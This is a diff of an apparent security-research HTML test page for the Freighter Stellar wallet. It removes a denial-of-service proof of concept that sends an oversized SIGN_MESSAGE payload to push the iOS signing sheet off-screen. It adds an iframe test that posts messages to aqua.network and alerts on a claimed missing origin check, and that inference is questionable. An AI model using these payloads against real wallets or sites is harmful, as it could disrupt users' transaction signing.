@@ -1,57 +1,37 @@
 <!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Freighter DoS PoC - Local Test</title>
-</head>
-<body style="font-family:sans-serif;padding:20px">
-<h3>Freighter iOS - DoS PoC (Local Only)</h3>
-<p>Payload ini dari issue #708 / signMessage bottom sheet.</p>
-<button id="btn" style="width:100%;padding:20px;font-size:18px;background:black;color:white;border-radius:12px">
-  TRIGGER LONG MESSAGE
-</button>
-<pre id="log" style="background:#eee;padding:10px;margin-top:20px;white-space:pre-wrap"></pre>
+<body>
+<h3>Test Iframe Origin - Freighter</h3>
+<p>Parent: 0x403for.github.io</p>
+<p>Child: aqua.network (iframe)</p>
+
+<iframe id="aqua" src="https://aqua.network" width="100%" height="600"></iframe>
 
 <script>
-const log = t => document.getElementById('log').innerText += t+"\n";
-
-log("window.stellar: " + JSON.stringify(window.stellar || "not found - bukan di Discovery tab"));
-
-document.getElementById('btn').onclick = () => {
-  // Payload yang bikin bottom sheet off-screen di v1.20.27 iOS
-  // 13 field x 64 char hex = ~ 900 char JSON
-  const payload = {
-    type: "CANONICAL_JSON_BOMB",
-    p1: "a".repeat(64),
-    p2: "b".repeat(64),
-    p3: "c".repeat(64),
-    p4: "d".repeat(64),
-    p5: "e".repeat(64),
-    p6: "f".repeat(64),
-    p7: "g".repeat(64),
-    p8: "h".repeat(64),
-    p9: "i".repeat(64),
-    p10: "j".repeat(64),
-    p11: "k".repeat(64),
-    p12: "l".repeat(64),
-    p13: "m".repeat(64)
+  const iframe = document.getElementById('aqua');
+  
+  // Tunggu iframe load
+  iframe.onload = () => {
+    console.log("Iframe loaded, kirim test postMessage...");
+    
+    // Kirim pesan PALSU dari 0x403for.github.io ke aqua.network
+    // Ini pesan aman, cuma string "PING", bukan transaksi
+    iframe.contentWindow.postMessage("PING_FROM_0x403for", "*");
+    
+    // Coba juga format yang mirip Freighter (tapi tetap aman, bukan sign)
+    iframe.contentWindow.postMessage({type: "TEST_ORIGIN_CHECK"}, "*");
   };
-  const msg = JSON.stringify(payload);
-  log("Sending length: " + msg.length);
 
-  // Cara Freighter Mobile terima dari Discovery WebView
-  try {
-    window.ReactNativeWebView.postMessage(JSON.stringify({
-      type: "SIGN_MESSAGE",
-      id: Date.now(),
-      payload: { message: msg }
-    }));
-    log("postMessage sent. Cek apakah bottom sheet muncul tapi tombol Confirm/Cancel hilang?");
-  } catch(e) {
-    log("Error: " + e);
-  }
-};
+  // Dengerin balasan dari aqua.network kalau ada
+  window.addEventListener("message", (event) => {
+    console.log("Dapet balasan! Origin:", event.origin, "Data:", event.data);
+    
+    // Kalau event.origin nya aqua.network tapi dia bales pesan dari kita
+    // Berarti dia NGGAK cek origin dengan benar = POTENSI BUG
+    if (event.origin.includes("aqua.network")) {
+      alert("BUG POTENTIAL: aqua.network bales pesan dari " + event.origin + " padahal kita dari 0x403for.github.io - dia gak cek origin!");
+    }
+  });
 </script>
 </body>
 </html>
